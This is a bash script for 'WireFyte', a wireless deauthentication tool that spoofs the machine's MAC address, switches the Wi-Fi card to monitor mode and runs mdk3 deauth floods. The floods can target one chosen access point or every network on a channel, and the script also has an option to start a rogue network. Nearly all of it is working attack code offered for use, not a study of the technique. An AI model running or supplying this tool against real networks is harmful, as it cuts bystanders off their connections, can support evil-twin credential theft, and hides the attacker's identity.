#!/bin/bash

#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#
#    WireFyte by @i_am_unbekannt            #
#                                           #
#   https://github.com/i-am-unbekannt       #
#   https://instagram.com/i_am_unbekannt    #
#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#

WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLUE="\e[0;34m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
BOLD_PURPLE="\e[1;35m"

function banner()
{
	echo " "
	echo -e "$BOLD_PURPLE  _ _ _ _         _____     _       "
	echo -e "$BOLD_PURPLE | | | |_|___ ___|   __|_ _| |_ ___  $BOLD_CYAN WireFyte"
	echo -e "$BOLD_PURPLE | | | | |  _| -_|   __| | |  _| -_| $WHITE a wireless deauther by @i_am_unbekannt"
	echo -e "$BOLD_PURPLE |_____|_|_| |___|__|  |_  |_| |___| $BLUE https://github.com/i-am-unbekannt/WireFyte"
	echo -e "$BOLD_PURPLE                       |___|         $BLUE https://flowcode.com/page/unbekannt"
	echo -e "$BOLD_WHITE"
}

function Supexit()
{
	clear
	banner
	sleep 2
	ifconfig $WI down
	macchanger -p $WI
	iwconfig $WI mode managed
	ifconfig $WI up
	echo -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE Quitting..."
	exit
}

function Access()
{
	clear
	sudo airmon-ng check kill 
	sudo airmon-ng start wlan0
	clear
	banner
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$BOLD_WHITE To stop networks press$BOLD_RED STRG+C"
	echo " "
	sudo python3 network.py
	exit
}

function getIFCARD() 
{
        echo -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE Your Interfaces$BOLD_RED: "
		echo " "
        echo -e -n "$BOLD_WHITE"
        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo " "
        echo -n -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE Select Interface $BOLD_RED>>$WHITE "
}

function changeMAC() 
{
        ifconfig $WI down
        iwconfig $WI mode monitor
        macchanger -r $WI
        ifconfig $WI up
}

if [ "$EUID" -ne 0 ]
	then clear 
		banner
		echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$BOLD_WHITE WireFyte$WHITE must be run as$BOLD_WHITE root"
		echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE re-run with $BOLD_WHITE'sudo bash WireFyte.sh'"
		exit
fi

clear
banner
echo -e "$BOLD_RED[$WHITE 1 $BOLD_RED]$WHITE Deauth BSSID"
echo -e "$BOLD_RED[$WHITE 2 $BOLD_RED]$WHITE Deauth CHANNEL"
echo -e "$BOLD_RED[$WHITE 3 $BOLD_RED]$WHITE Create NETWORK"
echo " "
echo -n -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE Option $BOLD_RED>>$WHITE "
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	banner
	nmcli dev wifi
	echo " "
	echo -n -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE BSSID $BOLD_RED>>$WHITE "
	read BSSID
	clear

	banner
	echo " "
	getIFCARD
	read WI
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE Starting Deauther..."
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE Press$BOLD_RED CTRL+C$WHITE to Stop!"
	echo " "
	changeMAC
	trap Supexit EXIT
	mdk3 $WI d -t "$BSSID"

elif [ $CHOICE == 2 ]; then
	banner
	nmcli dev wifi
	echo " "
	echo -n -e "$BOLD_RED[$WHITE * $BOLD_RED]$WHITE CHANNEL $BOLD_RED>>$WHITE "
	read CH
	clear

	banner
	echo " "
	getIFCARD
	read WI
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE Starting Deauther..."
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE Press$BOLD_RED CTRL+C$WHITE to Stop!"
	echo " "
	changeMAC
	trap supexit EXIT
	mdk3 $WI d -c $CH

elif [ $CHOICE == 3 ]; then
	Access

else
	echo -e "$BOLD_RED[$WHITE ! $BOLD_RED]$WHITE Invalid option, Restart script!"
	sleep 2
	Supexit
fi
